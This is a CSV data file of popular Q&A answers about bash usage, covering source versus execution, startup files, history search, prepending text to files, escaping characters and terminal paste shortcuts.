Title,Id,Tags,Score,Body
"What does 'source' do?","46139","<bash><shell><documentation>","654","<p><a href=""http://ss64.com/bash/source.html"" rel=""noreferrer""><code>source</code></a> is a bash shell built-in command that executes the content of the file passed as argument, <strong><em>in the current shell</em></strong>. It has a synonym in <code>.</code> (period).</p>

<blockquote>
  <p>Syntax</p>

<pre><code>. filename [arguments]

source filename [arguments]
</code></pre>
</blockquote>
"
"Difference between .bashrc and .bash_profile","183870","<bash><bashrc><.bash-profile>","496","<p>Traditionally, when you log into a Unix system, the system would start one program for you. That program is a shell, i.e., a program designed to start other programs. It's a command line shell: you start another program by typing its name. The default shell, a Bourne shell, reads commands from <code>~/.profile</code> when it is invoked as the login shell.</p>

<p>Bash is a Bourne-like shell. It reads commands from <code>~/.bash_profile</code> when it is invoked as the login shell, and if that file doesn't exist¹, it tries reading <code>~/.profile</code> instead.</p>

<p>You can invoke a shell directly at any time, for example by launching a terminal emulator inside a GUI environment. If the shell is not a login shell, it doesn't read <code>~/.profile</code>. When you start bash as an interactive shell (i.e., not to run a script), it reads <code>~/.bashrc</code> (except when invoked as a login shell, then it only reads <code>~/.bash_profile</code> or <code>~/.profile</code>.</p>

<p>Therefore:</p>

<ul>
<li><p><code>~/.profile</code> is the place to put stuff that applies to your whole session, such as programs that you want to start when you log in (but not graphical programs, they go into a different file), and environment variable definitions.</p></li>
<li><p><code>~/.bashrc</code> is the place to put stuff that applies only to bash itself, such as alias and function definitions, shell options, and prompt settings. (You could also put key bindings there, but for bash they normally go into <code>~/.inputrc</code>.)</p></li>
<li><p><code>~/.bash_profile</code> can be used instead of <code>~/.profile</code>, but it is read by bash only, not by any other shell. (This is mostly a concern if you want your initialization files to work on multiple machines and your login shell isn't bash on all of them.) This is a logical place to include <code>~/.bashrc</code> if the shell is interactive. I recommend the following contents in <code>~/.bash_profile</code>:</p>

<pre><code>if [ -r ~/.profile ]; then . ~/.profile; fi
case ""$-"" in *i*) if [ -r ~/.bashrc ]; then . ~/.bashrc; fi;; esac
</code></pre></li>
</ul>

<p>On modern unices, there's an added complication related to <code>~/.profile</code>. If you log in in a graphical environment (that is, if the program where you type your password is running in graphics mode), you don't automatically get a login shell that reads <code>~/.profile</code>. Depending on the graphical login program, on the window manager or desktop environment you run afterwards, and on how your distribution configured these programs, your <code>~/.profile</code> may or may not be read. If it's not, there's usually another place where you can define environment variables and programs to launch when you log in, but there is unfortunately no standard location.</p>

<p>Note that you may see here and there recommendations to either put environment variable definitions in <code>~/.bashrc</code> or always launch login shells in terminals. Both are bad ideas. The most common problem with either of these ideas is that your environment variables will only be set in programs launched via the terminal, not in programs started directly with an icon or menu or keyboard shortcut.</p>

<p>¹ <sub> For completeness, by request: if <code>.bash_profile</code> doesn't exist, bash also tries <code>.bash_login</code> before falling back to <code>.profile</code>. Feel free to forget it exists. </sub>  </p>
"
"What is the difference between executing a Bash script vs sourcing it?","176783","<linux><bash><script>","350","<p><strong>Sourcing</strong> a script will run the commands in the <em>current</em> shell process. </p>

<p><strong>Executing</strong> a script will run the commands in a <em>new</em> shell process. </p>

<p>Use source if you want the script to change the environment in your currently running shell. use execute otherwise.</p>

<p>If you are still confused, please read on. </p>

<h2>Terminology</h2>

<p>To clarify some common confusion about the syntax to execute and the syntax to source:</p>

<pre><code>./myscript
</code></pre>

<p>This will <strong>execute</strong> <code>myscript</code> provided that the file is executable and located in the current directory. The leading dot and slash (<code>./</code>) denotes the current directory. This is necessary because the current directory is usually not (and usually should not be) in <code>$PATH</code>.</p>

<pre><code>myscript
</code></pre>

<p>This will <strong>execute</strong> <code>myscript</code> if the file is executable and located in some directory in <code>$PATH</code>.</p>

<pre><code>source myscript
</code></pre>

<p>This will <strong>source</strong> <code>myscript</code>. The file need not be executable but it must be a valid shell script. The file can be in current directory or in a directory in <code>$PATH</code>.</p>

<pre><code>. myscript
</code></pre>

<p>This will also <strong>source</strong> <code>myscript</code>. This ""spelling"" is the official one as defined by <a href=""http://pubs.opengroup.org/onlinepubs/9699919799/utilities/V3_chap02.html#dot"" rel=""noreferrer"">POSIX</a>. Bash defined <code>source</code> as an alias to the dot.</p>

<h2>Demonstration</h2>

<p>Consider <code>myscript.sh</code> with following content:</p>

<pre><code>#!/bin/sh
# demonstrate setting a variable
echo ""foo: ""$(env | grep FOO)
export FOO=foo
echo ""foo: ""$(env | grep FOO)
# demonstrate changing of working directory
echo ""PWD: ""$PWD
cd somedir
echo ""PWD: ""$PWD
</code></pre>

<p>Before we execute the script first we check the current environment:</p>

<pre><code>$ env | grep FOO
$ echo $PWD
/home/lesmana
</code></pre>

<p>The variable <code>FOO</code> is not defined and we are in the home directory.</p>

<p>Now we <strong>execute</strong> the file:</p>

<pre><code>$ ./myscript.sh
foo:
foo: FOO=foo
PWD: /home/lesmana
PWD: /home/lesmana/somedir
</code></pre>

<p>Check the environment again:</p>

<pre><code>$ env | grep FOO
$ echo $PWD
/home/lesmana
</code></pre>

<p>The variable <code>FOO</code> is not set and the working directory did not change.</p>

<p>The script output clearly shows that the variable was set and the directory was changed. The check afterwards show that the variable is not set and the directory not changed. What happened? The changes were made in a <em>new</em> shell. The <em>current</em> shell spawned a <em>new</em> shell to run the script. The script is running in the new shell and all changes to the environment take effect in the new shell. After the script is done the new shell is destroyed. All changes to the environment in the new shell are destroyed with the new shell. Only the output text is printed in the current shell.</p>

<p>Now we <strong>source</strong> the file:</p>

<pre><code>$ source myscript.sh
foo:
foo: FOO=foo
PWD: /home/lesmana
PWD: /home/lesmana/somedir
</code></pre>

<p>Check the environment again:</p>

<pre><code>$ env | grep FOO
FOO=foo
$ echo $PWD
/home/lesmana/somedir
</code></pre>

<p>The variable FOO is set and the working directory has changed.</p>

<p>Sourcing the script does not create a new shell. All commands are run in the current shell and changes to the environment take effect in the current shell.</p>

<p>Note that in this simple example the output of executing is the same as sourcing the script. This is not necessarily always the case.</p>

<h2>Another Demonstration</h2>

<p>Consider following script <code>pid.sh</code>:</p>

<pre><code>#!/bin/sh
echo $$
</code></pre>

<p>(the special variable <code>$$</code> expands to the PID of the current running shell process)</p>

<p>First print the PID of the current shell:</p>

<pre><code>$ echo $$
25009
</code></pre>

<p>Source the script:</p>

<pre><code>$ source pid.sh
25009
</code></pre>

<p>Execute the script, note the PID:</p>

<pre><code>$ ./pid.sh
25011
</code></pre>

<p>Source again:</p>

<pre><code>$ source pid.sh
25009
</code></pre>

<p>Execute again:</p>

<pre><code>$ ./pid.sh
25013
</code></pre>

<p>You can see that sourcing the script runs in the same process while executing the script creates a new process everytime. That new process is the <em>new</em> shell which was created for the execution of the script. Sourcing the script does not create a new shell and thus the PID stays the same.</p>

<h2>Summary</h2>

<p>Both sourcing and executing the script will run the commands in the script line by line, as if you typed those commands by hand line by line.</p>

<p>The differences are:</p>

<ul>
<li>When you <em>execute</em> the script you are opening a <em>new</em> shell, type the commands in the new shell, copy the output back to your current shell, then close the new shell. Any changes to environment will take effect only in the new shell and will be lost once the new shell is closed.</li>
<li>When you <em>source</em> the script you are typing the commands in your <em>current</em> shell. Any changes to the environment will take effect and stay in your current shell.</li>
</ul>

<p>Use source if you want the script to change the environment in your currently running shell. use execute otherwise.</p>

<hr>

<p>See also:</p>

<ul>
<li><a href=""https://stackoverflow.com/questions/6331075/why-do-you-need-dot-slash-before-script-name-to-run-it-in-bash"">https://stackoverflow.com/questions/6331075/why-do-you-need-dot-slash-before-script-name-to-run-it-in-bash</a></li>
<li><a href=""https://askubuntu.com/questions/182012/is-there-a-difference-between-and-source-in-bash-after-all"">https://askubuntu.com/questions/182012/is-there-a-difference-between-and-source-in-bash-after-all</a></li>
</ul>
"
"How do I add text to the beginning of a file in Bash?","246837","<bash>","349","<p><strong>Linux :</strong></p>
<pre><code>echo 'task goes here' | cat - todo.txt &gt; temp &amp;&amp; mv temp todo.txt
</code></pre>
<p>or</p>
<pre><code>sed -i '1s/^/task goes here\n/' todo.txt
</code></pre>
<p>or</p>
<pre><code>sed -i '1itask goes here' todo.txt
</code></pre>
<p><strong>Mac os x :</strong></p>
<pre><code>sed -i '.bak' '1s/^/task goes here\'$'\n/g' todo.txt
</code></pre>
<p>or</p>
<pre><code>echo -e &quot;task goes here\n$(cat todo.txt)&quot; &gt; todo.txt
</code></pre>
<p>or</p>
<pre><code>echo 'task goes here' | cat - todo.txt &gt; temp &amp;&amp; mv temp todo.txt
</code></pre>
"
"How can I search the bash history and rerun a command?","7414","<unix><bash>","328","<p>Type <kbd>Ctrl</kbd> <kbd>R</kbd> at the command line and start typing the previous command.  Once a result appears keep hitting <kbd>Ctrl</kbd> <kbd>R</kbd> to see other matches.  When the command you want appears, simply press <kbd>Enter</kbd></p>

<p>Note that while <kbd>Ctrl</kbd> <kbd>R</kbd> is the default, if you wanted the command (<code>reverse-search-history</code>) to be bound to <kbd>Ctrl</kbd> <kbd>T</kbd> you could configure that with the following:</p>

<pre>
bind '""\C-t"": reverse-search-history'
</pre>

<p>There are a whole host of other readline bindable commands that are available to you as well.  Take a look at the <a href=""http://www.gnu.org/software/bash/manual/bashref.html#Bindable-Readline-Commands"" rel=""noreferrer""><code>bash</code> man page</a>.</p>

<p>Bash has many facilities to search and access interactive command history.  The most basic of which is the <code>history</code> builtin.  Typing just:</p>

<pre>
$ history
</pre>

<p>Will print a list of commands along with a numeric index, like:</p>

<pre>
$ history
1 clear
2 ls -al
3 vim ~/somefile.txt
4 history
$
</pre>

<p>You can then execute any of these commands using their numeric index by prefacing the index with a single <code>!</code>, as <a href=""https://superuser.com/users/2681/mitch"">Mitch</a> pointed out:</p>

<pre>
$ !1
</pre>

<p>Will execute the <code>clear</code> command.  The history builtin has many features itself, you can see more in the <code>bash</code> and <code>history</code> man pages.</p>

<p>You can also specify relative negative offsets when using the <code>!</code> designator, so using our history list above, if we wanted to execute <code>vim</code> again, we could do:</p>

<pre>
$ !-2
</pre>

<p>Which is basically telling bash to execute the command you ran ""two commands ago.""  To run the previous command in the history list, we can just use <code>!!</code> (which is just shorthand for <code>!-1</code>).</p>

<p>The <code>!</code> designator doesn't limit you to numerically specifying which command to run. <a href=""https://superuser.com/users/770/hayalci"">hayalci</a> showed that you can instruct <code>bash</code> to execute a command based on either the text it begins with (using <code>!</code>) or text within the command itself (using <code>!?</code>).  Again, using our example history list above, if we wanted to execute <code>clear</code> again, all we need to do is type:</p>

<pre>
$ !cl
</pre>

<p>and press <kbd>Enter</kbd>.  And what about <code>vim</code>?  That is as simple as:</p>

<pre>
$ !?some
</pre>

<p>The most important point from <a href=""https://superuser.com/users/770/hayalci"">hayalci</a>'s response is the call to the <code>shopt</code> builtin:</p>

<pre>
$ shopt -s histverify
</pre>

<p>This will enable history verification so that commands that are matched by the <code>!</code>, <code>!!</code>, and <code>!?</code> designators are not blindly executed, but instead filled in on the command line so you can ensure they will do no evil before executing them.  This is even more important when you are executing commands as the root user.  This option can be set in your <code>.bashrc</code> startup file so that it is set whenever you log in.</p>

<p>As has already been pointed out, all of this information can be gleaned from the <a href=""http://www.gnu.org/software/bash/manual/bashref.html"" rel=""noreferrer""><code>bash</code> man page</a>.  For the !, !!, and !? designators, take a look at Section <a href=""http://www.gnu.org/software/bash/manual/bashref.html#History-Interaction"" rel=""noreferrer"">9.3 History Expansion</a>.</p>
"
"Go back to previous directory in shell","113219","<linux><command-line><bash>","324","<p><code>cd -</code> (goes back to previous directory)</p>

<p>If you want to be able to go to the other previous directories, this is not possible out of the box. But check this script and instructions:</p>

<p><a href=""http://linuxgazette.net/109/marinov.html""><strong>History of visited directories in BASH</strong></a></p>

<blockquote>
  <p>The cd command works as usual. The new
  feature is the history of the last 10
  directories and the cd command
  expanded to display and access it. cd
  -- (or simply pressing ctrl+w) shows the history. In front of every
  directory name you see a number. cd
  -num with the number you want jumps to the corresponding directory from the
  history.</p>
</blockquote>
"
"Bash: Iterating over lines in a variable","284187","<bash>","282","<p>With bash, if you want to embed newlines in a string, enclose the string with <code>$''</code>:</p>

<pre><code>$ list=""One\ntwo\nthree\nfour""
$ echo ""$list""
One\ntwo\nthree\nfour
$ list=$'One\ntwo\nthree\nfour'
$ echo ""$list""
One
two
three
four
</code></pre>

<p>And if you have such a string already in a variable, you can read it line-by-line with:</p>

<pre><code>while IFS= read -r line; do
    echo ""... $line ...""
done &lt;&lt;&lt; ""$list""
</code></pre>
"
"In bash, how do I escape an exclamation mark?","133780","<bash><syntax><escape-characters>","210","<p>Since you do not depend on bash to expand variables in your commit message you could use single quotes instead. Strings in single quotes are not expanded by bash.</p>

<pre><code>bzr commit -m 'This does work!' 
</code></pre>
"
"Using watch with pipes","140461","<bash><grep><tail><watch>","206","<p>Surround the command with quotes</p>

<pre><code>watch -n 1 'tail -n 200 log/site_dev.log | fgrep Doctrine'
</code></pre>
"
"Why does Ctrl + V not paste in Bash (Linux shell)?","421463","<linux><bash><keyboard-shortcuts><copy-paste><clipboard>","202","<p>In the days of physical <a href=""http://en.wikipedia.org/wiki/Computer_terminal"" rel=""noreferrer"" title=""Computer terminal &ndash; Wikipedia"">terminals</a>, session-wide clipboards did not exist, only few programs supported internal copy/paste &ndash; often under the name of ""buffers"" or ""kill rings"" &ndash; and used various different keystrokes. For example, the <em>bash</em> shell uses <kbd>Ctrl</kbd><kbd>K</kbd> or <kbd>Ctrl</kbd><kbd>U</kbd> to ""kill"" (cut), <kbd>Ctrl</kbd><kbd>Y</kbd> to ""yank"" (paste); this comes from <a href=""http://www.emacswiki.org/emacs/KillingAndYanking"" rel=""noreferrer"" title=""Killing And Yanking &ndash; Emacs wiki"">the <em>emacs</em> editor</a>.</p>

<p><kbd>Ctrl</kbd><kbd>C</kbd> almost everywhere in Unix was the <a href=""http://en.wikipedia.org/wiki/Control-C#In_command-line_environments"" rel=""noreferrer"" title=""Control-C in command line environments &ndash; Wikipedia"">""interrupt"" key</a>, used to cancel the current program or operation. The <kbd>Ctrl</kbd><kbd>V</kbd> key often meant ""verbatim insert"" &ndash; that is, insert the following character literally without performing any associated action. For example, a normal <kbd>Esc</kbd> switches to command mode in the <em>vi</em> editor, but <kbd>Ctrl</kbd><kbd>V</kbd>, <kbd>Esc</kbd> will insert the <code>ESC</code> character into the document.</p>



<p>The use of <kbd>Ctrl</kbd><kbd>C</kbd> to copy and <kbd>Ctrl</kbd><kbd>V</kbd> to paste from session-wide clipboard was introduced by Mac OS in 1983 and Microsoft Windows 3.x in 1990. (Earlier Windows versions (1.x and 2.x), as well as IBM OS/2, only supported the <a href=""http://en.wikipedia.org/wiki/IBM_Common_User_Access"" rel=""noreferrer"" title=""IBM Common User Access &ndash; Wikipedia"">IBM CUA</a> keys <kbd>Ctrl</kbd><kbd>Ins</kbd> to copy and <kbd>Shift</kbd><kbd>Ins</kbd> to paste; these shortcuts remain supported by all Windows versions.)</p>

<p>When GUIs with clipboard support finally reached Unix, the <kbd>Ctrl</kbd> keypresses were already in use by many terminal programs. In addition, the X graphical interface had somewhat <a href=""http://www.jwz.org/doc/x-cut-and-paste.html"" rel=""noreferrer"" title=""X Selections, Cut Buffers, and Kill Rings &ndash; jwz"">different mechanisms</a>: ""selections"" and ""cut buffers"". Even now you can select text in one program and insert it using the middle mouse button, without any explicit copy action.</p>

<p>In short, by the time Xterm and GNOME Terminal were written (I'm guessing you use the latter), <kbd>Ctrl</kbd><kbd>V</kbd> <em>already had</em> a completely different meaning for many years and could not be changed. In addition, an alternative method of copying text &ndash; the ""selection"" &ndash; was already present in X11, so explicit copy/paste action was probably considered not as important as it would be in Windows. This means that different keyboard shortcuts had to be selected &ndash; for example, most modern terminal programs, like GNOME Terminal, use <kbd>Ctrl</kbd><kbd>Shift</kbd><kbd>C</kbd> and <kbd>Ctrl</kbd><kbd>Shift</kbd><kbd>V</kbd>. (If you use Xterm, the same shortcuts can be added manually using the <em>XTerm*vt100*translations</em> Xresource. Rxvt does not have such an option.)</p>

<p>(Most X11 toolkits also support the CUA ""copy"" and ""paste"" keys, which do not conflict with terminal programs. Unfortunately, the implementations are rather inconsistent &ndash; <kbd>Ctrl</kbd><kbd>Ins</kbd> copies to the ""clipboard"" in most programs (GTK, Qt4, but ignored by Xaw); however, <kbd>Shift</kbd><kbd>Ins</kbd> pastes from the ""primary selection"" in most GTK and Qt4 programs, but from ""clipboard"" in Firefox, and from the now-obsolete cut-buffers in the now-obsolete Xaw.)</p>

<hr>

<p>All that said, some terminals or consoles (in particular, the Windows 10 console) <em>do</em> support these keys. As the Windows console always had a separate ""mark/select"" mode, <kbd>Ctrl</kbd><kbd>C</kbd> now also has two meanings based on context – in regular mode it sends an interrupt, in select mode it copies to clipboard (just like <kbd>Enter</kbd> used to).</p>

<p>Meanwhile, Windows command-line tools never really <em>used</em> <kbd>Ctrl</kbd><kbd>V</kbd> for anything, so it was bound to ""paste"" without disturbing much anything. Doing the same on Unix-like terminals however would be more problematic.</p>
"
